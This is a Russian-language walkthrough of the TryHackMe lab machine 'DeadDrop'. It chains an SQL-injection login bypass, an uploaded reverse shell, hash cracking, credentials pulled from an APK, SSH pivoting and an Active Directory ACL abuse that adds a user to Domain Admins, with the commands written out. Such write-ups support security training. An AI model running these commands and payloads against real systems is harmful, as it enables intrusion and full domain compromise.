# Отчёт о прохождении машины DeadDrop (Senior Red Team)

## 1. Общая информация

**Заказчик:** DeadDrop Ltd — компания, предоставляющая услуги обмена файлами для корпоративных клиентов.

**Цель:** Провести внешний пентест веб-приложения и внутренней корпоративной сети. Основная задача — скомпрометировать контроллер домена (Domain Controller) и получить флаг с рабочего стола администратора.

**Исходные данные:** Доступ к веб-серверу DeadDrop-WEB через HTTP и SSH. Внутренняя сеть `192.168.11.0/24` недоступна напрямую — требуется пивотинг.

**Область тестирования:**

- Веб-сервер DeadDrop-WEB (порты 80, 22)
- Внутренняя сеть 192.168.11.0/24 (рабочая станция и контроллер домена)
- Active Directory-атаки, пивотинг, сбор учётных данных

**Исключения:** DoS-атаки, социальная инженерия, модификация/удаление данных в production.


## 2. Разведка и анализ веб-приложения

### 2.1 Nmap-скан

Выполнен внешний сканирование доступного веб-сервера:

```
80/tcp — HTTP (Node.js)
22/tcp — SSH
```

### 2.2 Фаззинг и обнаружение уязвимости

При фаззинге веб-приложения обнаружена страница `/Login` (Status 200), содержащая форму входа.

Проведена проверка на SQL-инъекцию с использованием пейлоада:

```
username=test' OR 1=1 -- &password=test
```

Инъекция сработала. Сервер перенаправил на `/dashboard` и установил сессионные куки. Таким образом, была получена неавторизованная аутентификация в панели управления.


## 3. Эксплуатация веб-приложения и получение доступа

### 3.1 Reverse Shell через загрузку .js файла

После входа в панель управления обнаружена функциональность загрузки файлов и их предварительного просмотра (preview).

Для получения удалённого доступа был подготовлен JavaScript-файл с reverse shell. После загрузки и открытия в режиме превью получен shell на сервере.

```bash
node@tryhackme-2404:/opt/app$ id
uid=996(node) gid=996(node) groups=996(node)
```

### 3.2 Стабилизация оболочки

Выполнена стандартная стабилизация shell для комфортной работы.


## 4. Сбор учётных данных

### 4.1 Нахождение хэша пароля пользователя svc-drop

В директории `/opt/app/backup` обнаружен файл `shadow.bak`, содержащий хэш пароля пользователя `svc-drop` в формате SHA-512:

```
svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::
```

### 4.2 Взлом хэша через John the Ripper

Хэш был сконвертирован в формат для John и взломан с использованием словаря `rockyou.txt`.

**Пароль:** `dropsofjupiter`

### 4.3 Подключение по SSH

С найденным паролем выполнено подключение по SSH к серверу:

```bash
ssh svc-drop@<IP>
```


## 5. Реверс-инжиниринг мобильного приложения

### 5.1 Обнаружение APK-файла

В домашней директории пользователя `svc-drop` найден файл `deaddrop-mobile.apk`.

### 5.2 Анализ APK через JADX

Файл был скопирован на локальную машину и декомпилирован с помощью `jadx-gui`.

В ходе реверс-инжиниринга в файле `Config` обнаружены учётные данные:

```java
public static final String API_ENDPOINT = "http://internal.tryhackme.loc/api/v1";
public static final String DEFAULT_PASSWORD = "DropsOfJupiter2026!";
public static final String DEFAULT_USERNAME = "j.harris";
public static final String ENVIRONMENT = "production";
```


## 6. Пивотинг во внутреннюю сеть

### 6.1 Настройка SSH-туннеля

Для доступа к внутренней сети `192.168.11.0/24` использован `sshuttle`:

```bash
sshuttle -r svc-drop@<IP> 192.168.11.0/24
```

Впоследствии заменён на `ssh -D 1081` + `proxychains` для более гибкой работы с инструментами.

### 6.2 Обнаружение контроллера домена

Сканирование через прокси выявило хост `192.168.11.100` с открытыми портами:

- 88 — Kerberos
- 389 — LDAP
- 445 — SMB
- 464 — kpasswd

Наличие этих портов подтвердило, что хост является контроллером домена `deaddrop.loc`.


## 7. Перечисление (Enumeration) в Active Directory

### 7.1 Проверка SMB-доступа

С учётными данными `j.harris:DropsOfJupiter2026!` выполнен доступ к SMB-шарам:

```bash
proxychains -f ./proxychains4.conf nxc smb 192.168.11.100 -u j.harris -p DropsOfJupiter2026!
```

Успешно получен доступ к шарам `ADMIN$`, `C$`, `NETLOGON`, `SYSVOL`.

### 7.2 Идентификация домена

С помощью `enum4linux` определён домен `deaddrop.loc`, а также установлена версия ОС: Windows Server 2019.

### 7.3 Ограничения BloodHound

Попытка использования `bloodhound-python` не увенчалась успехом из-за проблем с DNS-резолвингом через прокси. Вместо этого использован ручной LDAP-поиск.


## 8. Поиск делегированных прав (ACL Delegation)

### 8.1 Проверка ACL через nxc

С помощью модуля `daclread` в `nxc ldap` проведён анализ прав доступа для объекта `Domain Admins`:

```bash
proxychains -f ./proxychains4.conf nxc ldap 192.168.11.100 \
  -u j.harris -p DropsOfJupiter2026! \
  -M daclread -o TARGET_DN="CN=Domain Admins,CN=Users,DC=deaddrop,DC=loc"
```

### 8.2 Результат анализа

В выводе обнаружена запись ACE[9]:

```
ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
Access mask               : WriteProperty
Flags                     : ACE_OBJECT_TYPE_PRESENT
Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
Trustee (SID)             : j.harris (S-1-5-21-2304234032-2319324522-87291130-1103)
```

**Интерпретация:** Учётная запись `j.harris` имеет право **`WriteProperty`** на атрибут **`Self-Membership`** для группы **`Domain Admins`**. Это означает, что пользователь может добавить себя в группу Domain Admins без необходимости быть её членом.


## 9. Эскалация привилегий через ACL Delegation

### 9.1 Подготовка LDIF-файла

Создан файл `add.ldif` для добавления пользователя в группу:

```ldif
dn: CN=Domain Admins,CN=Users,DC=deaddrop,DC=loc
changetype: modify
add: member
member: CN=Jamie Harris,CN=Users,DC=deaddrop,DC=loc
```

### 9.2 Выполнение через ldapmodify

```bash
proxychains -f ./proxychains4.conf ldapmodify -x \
  -H ldap://192.168.11.100 \
  -D "j.harris@deaddrop.loc" \
  -w 'DropsOfJupiter2026!' \
  -f add.ldif
```

### 9.3 Проверка членства

После выполнения проверено членство пользователя `j.harris`:

```bash
proxychains -f ./proxychains4.conf ldapsearch -x \
  -H ldap://192.168.11.100 \
  -D "j.harris@deaddrop.loc" \
  -w 'DropsOfJupiter2026!' \
  -b "dc=deaddrop,dc=loc" "(sAMAccountName=j.harris)" memberOf
```

Результат:

```
memberOf: CN=ITSupport-Admins,CN=Users,DC=deaddrop,DC=loc
memberOf: CN=Domain Admins,CN=Users,DC=deaddrop,DC=loc
```

Успешно. `j.harris` теперь член группы `Domain Admins`.


## 10. Получение полного контроля над доменом

### 10.1 Подключение через psexec

С использованием `psexec.py` получен удалённый доступ к контроллеру домена:

```bash
proxychains -f ./proxychains4.conf psexec.py \
  deaddrop.loc/j.harris:'DropsOfJupiter2026!'@192.168.11.100
```

### 10.2 Получение финального флага

На рабочем столе администратора найден флаг:

```
C:\Users\Administrator\Desktop> type flag.txt
THM{d34d_dr0p_d0m41n_pwn3d}
```


## 11. Итог

### 11.1 Цепочка атаки

1. **Внешняя разведка:** nmap, фаззинг → обнаружение SQL-инъекции в форме входа.
2. **Получение первого доступа:** эксплуатация SQL-инъекции → панель управления → загрузка JS-шелла → reverse shell как `node`.
3. **Сбор данных:** дамп хэша `svc-drop` из `shadow.bak` → взлом через John → доступ по SSH.
4. **Реверс-инжиниринг APK:** извлечение учётных данных `j.harris:DropsOfJupiter2026!`.
5. **Пивотинг:** `sshuttle` → `proxychains` для доступа к внутренней сети.
6. **Перечисление AD:** обнаружение DC, проверка SMB, LDAP-поиск.
7. **ACL Delegation:** выявление права `WriteProperty` на `Self-Membership` для группы `Domain Admins`.
8. **Эскалация:** добавление `j.harris` в `Domain Admins` через `ldapmodify`.
9. **Полный доступ:** `psexec` на DC → флаг администратора.

### 11.2 Ключевые команды и техники

- **SQL Injection:** `username=test' OR 1=1 --`
- **Reverse Shell:** загрузка `.js` через панель управления.
- **Взлом SHA-512:** `john --format=sha512crypt --wordlist=rockyou.txt shadow.bak`
- **Реверс-инжиниринг:** `jadx-gui deaddrop-mobile.apk`
- **Пивотинг:** `ssh -D 1081`, `proxychains`
- **ACL Enumeration:** `nxc ldap -M daclread`
- **ACL Delegation Abuse:** `ldapmodify` с LDIF-файлом
- **Pass-the-Hash / DCSync:** не потребовались, так как эскалация выполнена через делегирование.

### 11.3 Достижения и новые навыки

**ACL Delegation (WriteProperty на Self-Membership):** впервые применена техника эскалации прав через делегирование доступа в Active Directory. Использован модуль `daclread` для выявления права `WriteProperty` на атрибут `Self-Membership`, что позволило добавить пользователя в группу `Domain Admins` без необходимости быть её членом. Освоена работа с `ldapmodify` и LDIF-файлами для модификации объектов AD через прокси.

**Реверс-инжиниринг APK:** впервые проведён анализ мобильного приложения с использованием `jadx-gui`. Извлечены учётные данные из скомпилированного Java-кода, что позволило получить доступ к внутренней сети.

**Пивотинг через SSH + proxychains:** отработана техника организации туннеля через SOCKS-прокси для доступа к изолированной сети. Освоены `ssh -D` и настройка `proxychains` для работы с инструментами, включая `nxc`, `ldapmodify`, `secretsdump`.

**Обход отсутствия DNS через прокси:** при невозможности использовать DNS-разрешение для `bloodhound-python` применён ручной LDAP-поиск и `nxc` для перечисления AD.

**Работа с LDAP через прокси:** освоено использование `ldapmodify` и `ldapsearch` через SOCKS-прокси для модификации объектов Active Directory.

**SQL-инъекция в Node.js приложении:** несмотря на фильтрацию, отмечено, что использование `OR 1=1` позволило обойти аутентификацию. Получен опыт эксплуатации веб-уязвимостей в среде Node.js.
